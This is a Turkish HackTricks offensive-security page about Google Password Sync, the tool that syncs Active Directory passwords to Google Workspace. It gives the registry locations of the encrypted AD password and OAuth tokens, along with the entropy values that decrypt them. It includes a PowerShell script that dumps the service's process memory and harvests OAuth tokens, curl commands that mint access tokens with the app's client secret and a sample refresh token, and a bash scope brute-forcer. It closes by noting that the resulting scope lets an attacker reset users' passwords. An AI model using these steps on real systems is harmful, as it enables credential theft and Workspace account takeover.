# GPS - Google Password Sync

{{#include ../../../banners/hacktricks-training.md}}

## Temel Bilgiler

Bu, Google'ın **AD ile Workspace arasındaki kullanıcı şifrelerini senkronize tutmak için** sunduğu ikili dosya ve hizmettir. Bir kullanıcı AD'de şifresini her değiştirdiğinde, bu Google'a ayarlanır.

`C:\Program Files\Google\Password Sync` dizinine kurulur; burada yapılandırmak için `PasswordSync.exe` ikili dosyasını ve çalışmaya devam edecek olan `password_sync_service.exe` hizmetini bulabilirsiniz.

### GPS - Yapılandırma

Bu ikili dosyayı (ve hizmeti) yapılandırmak için, **Workspace'de bir Süper Yönetici yetkisi vermek** gereklidir:

- Google ile **OAuth** üzerinden giriş yapın ve ardından **şifreli bir token'ı kayıt defterine** kaydedecektir.
- Sadece GUI'ye sahip Alan Denetleyicilerinde mevcuttur.
- **Workspace kullanıcılarını yönetme** yetkisine sahip **GCP'den bazı Hizmet Hesabı kimlik bilgileri** (json dosyası) vermek.
- Bu kimlik bilgileri asla süresi dolmadığı için kötü bir fikirdir ve kötüye kullanılabilir.
- Workspace üzerinde bir SA'ya erişim vermek çok kötü bir fikirdir çünkü SA GCP'de tehlikeye girebilir ve Workspace'e geçiş yapmak mümkün olabilir.
- Google, GUI'siz alan kontrolü için bunu gerektirir.
- Bu kimlik bilgileri de kayıt defterinde saklanır.

AD ile ilgili olarak, mevcut **uygulama bağlamını, anonim veya bazı özel kimlik bilgilerini** kullanması için belirtmek mümkündür. Kimlik bilgileri seçeneği seçilirse, **kullanıcı adı** bir dosyada **diskte** saklanır ve **şifre** **şifrelenir** ve **kayıt defterine** kaydedilir.

### GPS - Diskten şifre ve token dökme

> [!TIP]
> [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) aracının **GPS'i** tespit edebildiğini, yapılandırma hakkında bilgi alabileceğini ve **şifreyi ve token'ı bile şifreleyebileceğini** unutmayın.

**`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** dosyasında, yapılandırmanın bir kısmını, yapılandırılan AD'nin **`baseDN`**'sini ve kullanılan kimlik bilgileri için **`username`**'i bulmak mümkündür.

Kayıt defterinde **`HKLM\Software\Google\Google Apps Password Sync`** altında, AD kullanıcısı için **şifrelenmiş yenileme token'ı** ve **şifrelenmiş şifre** bulunabilir (varsa). Ayrıca, bir token yerine bazı **SA kimlik bilgileri** kullanılıyorsa, bu kimlik bilgileri de o kayıt defteri adresinde şifrelenmiş olarak bulunabilir. Bu kayıt defterindeki **değerler** yalnızca **Yönetici** tarafından **erişilebilir**.

Şifrelenmiş **şifre** (varsa) **`ADPassword`** anahtarının içindedir ve **`CryptProtectData`** API'si kullanılarak şifrelenmiştir. Şifreyi çözmek için, şifre senkronizasyonunu yapılandıran kullanıcı ile aynı kullanıcı olmanız ve **`CryptUnprotectData`** kullanırken bu **entropy**'yi kullanmanız gerekir: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Şifrelenmiş token (varsa) **`AuthToken`** anahtarının içindedir ve **`CryptProtectData`** API'si kullanılarak şifrelenmiştir. Şifreyi çözmek için, şifre senkronizasyonunu yapılandıran kullanıcı ile aynı kullanıcı olmanız ve **`CryptUnprotectData`** kullanırken bu **entropy**'yi kullanmanız gerekir: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Ayrıca, bu değerler **`0123456789abcdefghijklmnopqrstv`** sözlüğü ile base32hex kullanılarak kodlanmıştır.

Entropy değerleri, aracı kullanarak bulundu. Araç, **`CryptUnprotectData`** ve **`CryptProtectData`** çağrılarını izlemek için yapılandırıldı ve ardından `PasswordSync.exe`'yi başlatmak ve izlemek için kullanıldı; bu, yapılandırılan şifreyi ve kimlik doğrulama token'ını başta çözecek ve araç, her iki durumda kullanılan **entropy** değerlerini **gösterecektir**:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Ayrıca, bu API'lere yapılan çağrıların giriş veya çıkışında **şifrelenmemiş** değerleri görmek de mümkündür (eğer bir noktada Winpeas çalışmayı durdurursa).

Eğer Şifre Senkronizasyonu **SA kimlik bilgileri ile yapılandırılmışsa**, bu da kayıt defterindeki **`HKLM\Software\Google\Google Apps Password Sync`** anahtarları içinde saklanacaktır.

### GPS - Bellekten token dökme

GCPW ile olduğu gibi, `PasswordSync.exe` ve `password_sync_service.exe` süreçlerinin belleğini dökmek mümkündür ve yenileme ve erişim token'larını bulabileceksiniz (eğer zaten oluşturulmuşlarsa).\
Ayrıca, AD yapılandırılmış kimlik bilgilerini de bulabilirsiniz.

<details>

<summary>Dump <code>PasswordSync.exe</code> ve <code>password_sync_service.exe</code> süreçlerini ve token'ları arayın</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Yenileme jetonlarından erişim jetonları oluşturma

Yenileme jetonunu kullanarak, aşağıdaki komutta belirtilen istemci kimliği ve istemci sırrını kullanarak erişim jetonları oluşturmak mümkündür:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Kapsamlar

> [!NOTE]
> Bir refresh token'a sahip olsanız bile, erişim token'ı için herhangi bir kapsam talep etmenin mümkün olmadığını unutmayın, çünkü yalnızca **erişim token'ını oluşturduğunuz uygulamanın desteklediği kapsamları talep edebilirsiniz**.
>
> Ayrıca, refresh token her uygulamada geçerli değildir.

Varsayılan olarak GPS, kullanıcı olarak her olası OAuth kapsamına erişime sahip olmayacaktır, bu nedenle aşağıdaki script'i kullanarak `refresh_token` ile bir `access_token` oluşturmak için kullanılabilecek kapsamları bulabiliriz:

<details>

<summary>Kapsamları brute-force yapmak için Bash script'i</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anında aldığım çıktı:
```
https://www.googleapis.com/auth/admin.directory.user
```
Hangi, herhangi bir kapsam belirtmediğinizde aldığınızla aynıdır.

> [!CAUTION]
> Bu kapsamla mevcut bir kullanıcının **şifresini değiştirerek ayrıcalıkları artırabilirsiniz**.

{{#include ../../../banners/hacktricks-training.md}}
